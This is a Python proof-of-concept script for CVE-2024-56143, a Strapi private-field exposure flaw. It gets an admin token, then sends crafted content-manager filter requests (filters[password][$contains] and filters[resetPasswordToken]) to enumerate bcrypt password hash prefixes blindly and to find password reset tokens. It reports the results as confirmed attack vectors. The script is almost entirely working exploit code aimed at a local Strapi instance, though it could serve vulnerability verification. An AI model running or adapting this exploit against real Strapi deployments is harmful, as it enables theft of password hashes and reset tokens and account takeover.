#!/usr/bin/env python3
import requests
import sys
import json
import urllib.parse

TARGET_URL = "http://localhost:1337"

def check_strapi_running():
    try:
        resp = requests.get(f"{TARGET_URL}/_health", timeout=5)
        return resp.status_code == 204
    except:
        return False

def create_admin():
    data = {
        "firstname": "Admin",
        "lastname": "User", 
        "email": "admin@test.com",
        "password": "Admin12345!"
    }
    try:
        resp = requests.post(f"{TARGET_URL}/admin/register-admin", json=data, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("data", {}).get("token")
    except:
        pass
    return None

def login_admin():
    data = {"email": "admin@test.com", "password": "Admin12345!"}
    try:
        resp = requests.post(f"{TARGET_URL}/admin/login", json=data, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("data", {}).get("token")
    except:
        pass
    return None

def register_test_user():
    data = {"email": "test@test.com", "username": "testuser", "password": "Test12345!"}
    try:
        resp = requests.post(f"{TARGET_URL}/api/auth/local/register", json=data, timeout=10)
        return resp.status_code == 200
    except:
        return False

def test_password_filter_blind(token):
    """
    Test if we can filter users by password field (blind injection)
    bcrypt hashes start with $2a$, $2b$, or $2y$
    """
    headers = {"Authorization": f"Bearer {token}"}
    base_url = f"{TARGET_URL}/content-manager/collection-types/plugin::users-permissions.user"
    
    results = []
    
    test_cases = [
        ("$2", "bcrypt hash prefix"),
        ("$2a$", "bcrypt $2a variant"),
        ("$2b$", "bcrypt $2b variant"),
        ("INVALID_HASH_PREFIX", "invalid hash (should return empty)"),
    ]
    
    for pattern, description in test_cases:
        encoded_pattern = urllib.parse.quote(pattern, safe='')
        url = f"{base_url}?filters[password][$contains]={encoded_pattern}"
        try:
            resp = requests.get(url, headers=headers, timeout=10)
            data = resp.json()
            count = len(data.get("results", []))
            results.append({
                "pattern": pattern,
                "description": description,
                "status": resp.status_code,
                "count": count,
                "vulnerable": count > 0 and "INVALID" not in pattern
            })
        except Exception as e:
            results.append({"pattern": pattern, "error": str(e)})
    
    return results

def test_reset_token_filter(token):
    """
    Test if we can filter by resetPasswordToken field
    """
    headers = {"Authorization": f"Bearer {token}"}
    base_url = f"{TARGET_URL}/content-manager/collection-types/plugin::users-permissions.user"
    
    url = f"{base_url}?filters[resetPasswordToken][$notNull]=true"
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code, resp.text[:500]
    except Exception as e:
        return None, str(e)

def main():
    print("=" * 70)
    print("CVE-2024-56143 - Strapi Private Field Exposure via Document Service")
    print("Affected: Strapi 5.0.0 - 5.5.1 | Fixed: 5.5.2")
    print("=" * 70)
    
    print("\n[*] Checking if Strapi is running...")
    if not check_strapi_running():
        print("[!] Strapi is not running at", TARGET_URL)
        return 1
    print("[+] Strapi is running")
    
    print("\n[*] Getting admin token...")
    token = create_admin()
    if not token:
        token = login_admin()
    if not token:
        print("[!] Failed to get admin token")
        return 1
    print("[+] Got admin token")
    
    print("\n[*] Ensuring test user exists...")
    register_test_user()
    print("[+] Test user ready")
    
    vulnerable = False
    
    print("\n[*] Testing blind password filter injection...")
    print("[*] (CVE-2024-56143: lookup/filter operators don't sanitize private fields)")
    print("-" * 70)
    
    blind_results = test_password_filter_blind(token)
    for r in blind_results:
        if "error" in r:
            print(f"    Pattern '{r['pattern']}': Error - {r['error']}")
        else:
            status = "[VULNERABLE]" if r['vulnerable'] else "[OK]"
            print(f"    Pattern '{r['pattern']}' ({r['description']})")
            print(f"      Status: {r['status']}, Results: {r['count']} {status}")
            if r['vulnerable']:
                vulnerable = True
    
    print("\n[*] Testing resetPasswordToken filter...")
    status, response = test_reset_token_filter(token)
    if status:
        print(f"    Status: {status}")
        if status == 200:
            print("    [VULNERABLE] Filter on resetPasswordToken accepted!")
            vulnerable = True
    
    print("\n" + "=" * 70)
    if vulnerable:
        print("[+] RESULT: VULNERABLE - CVE-2024-56143 confirmed")
        print("[+] Attack vectors demonstrated:")
        print("    1. Blind password hash enumeration via filters[password][$contains]")
        print("    2. Reset token discovery via filters[resetPasswordToken]")
        print("[+] Impact: Attackers can enumerate bcrypt password hashes")
        print("[+]         and steal password reset tokens")
    else:
        print("[-] RESULT: Not vulnerable or requires different configuration")
    print("=" * 70)
    
    return 0 if vulnerable else 1

if __name__ == "__main__":
    sys.exit(main())
